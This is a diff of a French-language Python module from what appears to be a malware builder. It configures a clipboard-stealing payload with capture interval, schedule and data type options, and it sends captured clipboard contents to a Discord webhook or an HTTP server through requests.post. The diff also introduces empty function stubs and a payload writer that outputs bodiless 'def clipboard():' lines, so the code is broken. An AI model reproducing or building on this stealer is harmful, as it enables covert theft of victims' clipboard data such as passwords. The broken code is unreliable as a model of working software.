@@ -42,25 +42,28 @@ def clipboard_module():
     print("=== Clipboard Configuration ===\n\n")
     choix = {}            
 
-    def intervalle_capture():
-            clear()
-            print("Définir l'intervalle de capture en secondes.\n\n")
-            intervalle = input("""Intervalle (secondes) 'random' pour un temps entre 1 et 10 secondes : """)
-            try:
-                if intervalle.lower() == 'random':
-                    intervalle = random.randint(1, 10)
-                    print(f"Intervalle défini sur {intervalle} secondes.")
-                    time.sleep(2)
-                    choix["Intervalle de capture"] = intervalle
-                else:
-                    choix["Intervalle de capture"] = intervalle
-                    print(f"Intervalle défini sur {intervalle} secondes.")
-                    time.sleep(2)
-            except ValueError:
-                print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
+    def intervalle_capture_donne():
+        clear()
+        print("Définir l'intervalle de capture en secondes.\n\n")
+        intervalle = input("""Intervalle (secondes) 'random' pour un temps entre 1 et 10 secondes : """)
+        try:
+            if intervalle.lower() == 'random':
+                intervalle = random.randint(1, 10)
+                print(f"Intervalle défini sur {intervalle} secondes.")
                 time.sleep(2)
+                choix["Intervalle de capture"] = intervalle
+            else:
+                choix["Intervalle de capture"] = intervalle
+                print(f"Intervalle défini sur {intervalle} secondes.")
+                time.sleep(2)
+        except ValueError:
+            print(Fore.RED + "Veuillez entrer un nombre valide ou 'random'." + Style.RESET_ALL)
+            time.sleep(2)
 
-    def type_donnees():  
+    def intervalle_capture():
+
+
+    def type_donnees_donne():  
         clear()
         data_type = input("Définir le type de données à capturer (texte, images) : ")
         choix["Type de données à capturer"] = data_type
@@ -68,7 +71,10 @@ def clipboard_module():
         time.sleep(2)  
 
 
-    def taille_maximale():
+    def type_donnees():
+
+
+    def taille_maximale_donne():
         clear()
         try:
             taille = int(input("Définir la taille maximale du clipboard à capturer en Mo : "))
@@ -79,19 +85,26 @@ def clipboard_module():
             print(Fore.RED + "Veuillez entrer un nombre valide." + Style.RESET_ALL)
             time.sleep(2)
 
-    def limite_debit():
+
+    def taille_maximale():
+
+    def limite_debit_donne():
         clear()
         limite = int(input("Définir la limite de débit en envois/minute : "))
         choix["Limite de débit (envois/minute)"] = limite
         print(f"Limite de débit définie sur {limite} envois/minute.")
         time.sleep(2)
 
-    def seuil_longueur():
+    def limite_debit():
+
+    def seuil_longueur_donne():
         clear()
         long = int(input("Définir le seuil de longueur maximum du texte à capturer : "))
         choix["Seuil de longueur du texte"] = long
         print(f"Seuil de longueur défini sur {long}.")
         time.sleep(2)
+
+    def seuil_longueur():
 
     def valide_heure():
         try:
@@ -100,7 +113,7 @@ def clipboard_module():
         except ValueError:
             return False
 
-    def heure_debut():
+    def heure_debut_donne():
         clear()
         heure_debut = input("HH:MM de début : ")
         if not valide_heure(heure_debut):
@@ -110,8 +123,10 @@ def clipboard_module():
         choix["Heure de début de capture"] = heure_debut
         print(f"Heure de début de capture définie sur {heure_debut}.")
         time.sleep(2)
+
+    def heure_debut():
      
-    def heure_fin():
+    def heure_fin_donne():
         clear()
         heure_fin = input("HH:MM de fin : ")
         if not valide_heure(heure_fin):
@@ -122,7 +137,9 @@ def clipboard_module():
         print(f"Heure de fin de capture définie sur {heure_fin}.")
         time.sleep(2)
 
-    def debut_pause():
+    def heure_fin():
+
+    def debut_pause_donne():
         clear()
         heure_debut_pause = input("Définir l'heure de début de la pause de capture (HH:MM) : ")
         if not valide_heure(heure_debut_pause):
@@ -133,7 +150,9 @@ def clipboard_module():
         print(f"Heure de début de la pause de capture définie sur {heure_debut_pause}.")
         time.sleep(2)
 
-    def fin_pause():
+    def debut_pause():
+
+    def fin_pause_donne():
         clear()
         heure_fin_pause = input("Définir l'heure de fin de la pause de capture (HH:MM) : ")
         if not valide_heure(heure_fin_pause):
@@ -144,12 +163,15 @@ def clipboard_module():
         print(f"Heure de fin de la pause de capture définie sur {heure_fin_pause}.")
         time.sleep(2)
 
+    def fin_pause():
+
     def sauvegarde_locale():
         clear()
         reponse = input("Activer la sauvegarde locale ? (yes/no) : ")
         choix["Sauvegarde locale"] = (reponse.lower() == "yes")
         print(f"Sauvegarde locale {'activée' if reponse.lower() == 'yes' else 'désactivée'}.")
         time.sleep(2)
+
 
     def envoi_discord():
         clear()
@@ -176,7 +198,6 @@ def clipboard_module():
     import requests
 
     def clipboard_option_func():
-
         old = clipboard.paste()
 
         def envoyer():
@@ -192,10 +213,10 @@ def clipboard_module():
                 except requests.exceptions.RequestException as e:
                     print(f"Erreur lors de l'envoi sur Discord : {e}")
             if "Envoi sur serveur HTTP" in choix:
-                server_url = choix["Envoi sur serveur HTTP"]
+                reponse = choix["Envoi sur serveur HTTP"]
                 data = {"clipboard_data": old}
                 try:
-                    response = requests.post(server_url, json=data)
+                    response = requests.post(reponse, json=data)
                     if response.status_code == 200:
                         print("Données envoyées sur le serveur HTTP avec succès.")
                     else:
@@ -228,8 +249,8 @@ def clipboard_module():
     def create_payload():
         with open("Option/modules/payload/payload_created/clipboard_payload.pyw", "w") as f:
             for option, value in choix.items():
-                f.write(f"# {option} : {value}\n")
-            f.write("\n# Code du payload ici...\n")
+                f.write(f"def clipboard():\n")
+            f.write(f"\n")
 
     while True:
         affichage()
@@ -256,6 +277,7 @@ def clipboard_module():
 
         if cmd.lower() == "create":
             create_payload()
+            break
         
 
 
